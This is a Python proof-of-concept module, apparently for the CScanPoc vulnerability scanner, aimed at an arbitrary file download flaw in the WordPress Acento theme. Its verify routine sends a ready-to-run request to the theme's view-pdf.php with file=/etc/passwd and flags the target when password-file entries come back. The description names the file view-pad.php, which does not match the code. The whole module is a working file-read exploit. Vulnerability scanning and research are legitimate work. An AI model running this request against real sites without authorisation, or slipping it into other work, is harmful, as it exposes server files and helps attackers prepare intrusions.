# coding: utf-8

import urllib.request
import urllib.error
import urllib.parse
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0999'  # 平台漏洞编号，留空
    name = 'WordPress Acento Theme Arbitrary File Download'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_OPERATION  # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        wp主题插件acento theme 中view-pad.php 文件,可读取任意文件
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/34578/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3b0a393a-4c0a-456d-b7e0-5d23a39c5261'
    author = 'cscan'  # POC编写者
    create_date = '2018-3-24'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        path = "{target}/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/etc/passwd".format(
            target=self.target)
        self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
            target=self.target, vuln=self.vuln))
        try:
            request = urllib.request.Request(path)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            if 'root:' in content and 'nobody:' in content:
                self.output.report(self.vuln, '目标{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
